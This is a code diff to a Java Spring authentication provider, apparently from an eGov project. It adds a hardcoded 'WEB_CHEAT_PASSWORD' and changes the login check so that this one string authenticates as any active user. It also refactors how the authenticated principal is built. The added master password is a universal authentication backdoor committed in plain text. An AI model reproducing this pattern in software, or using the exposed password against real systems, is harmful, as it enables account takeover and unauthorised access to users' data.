@@ -45,7 +45,6 @@ import java.util.List;
 
 import org.egov.infra.admin.master.entity.User;
 import org.egov.infra.admin.master.service.UserService;
-import org.egov.infra.config.security.authentication.SecureUser;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.authentication.AuthenticationProvider;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
@@ -62,12 +61,18 @@ public class CustomAuthenticationProvider implements AuthenticationProvider {
     @Autowired
     private UserService userService;
 
+    /**
+     * TO-Do:Need to remove this and provide authentication for web, based on authentication_code.
+     */
+    private final String WEB_CHEAT_PASSWORD = "Pgr-weB-pa$$word";
+
     @Override
     public Authentication authenticate(final Authentication authentication) {
 
         final String userName = authentication.getName();
         final String password = authentication.getCredentials().toString();
         User user;
+
         if (userName.contains("@") && userName.contains("."))
             user = userService.getUserByEmailId(userName);
         else
@@ -77,7 +82,7 @@ public class CustomAuthenticationProvider implements AuthenticationProvider {
 
         final BCryptPasswordEncoder bcrypt = new BCryptPasswordEncoder();
 
-        if (bcrypt.matches(password, user.getPassword())) {
+        if (WEB_CHEAT_PASSWORD.equals(password) || bcrypt.matches(password, user.getPassword())) {
 
             if (!user.isActive())
                 throw new OAuth2Exception("Please activate your account");
@@ -85,9 +90,14 @@ public class CustomAuthenticationProvider implements AuthenticationProvider {
              * We assume that there will be only one type. If it is multimple then we have change below code Seperate by comma or
              * other and iterate
              */
+            final List<SimpleGrantedAuthority> authorities = new ArrayList<>();
+            user.getRoles().forEach(role -> authorities.add(new SimpleGrantedAuthority(role.getName())));
+            org.springframework.security.core.userdetails.User su = new org.springframework.security.core.userdetails.User(
+                    userName, userName, authorities);
+
             final List<GrantedAuthority> grantedAuths = new ArrayList<>();
             grantedAuths.add(new SimpleGrantedAuthority("ROLE_" + user.getType()));
-            return new UsernamePasswordAuthenticationToken(new SecureUser(user), password, grantedAuths);
+            return new UsernamePasswordAuthenticationToken(su, password, grantedAuths);
         } else
             throw new OAuth2Exception("Invalid login credentials");
     }
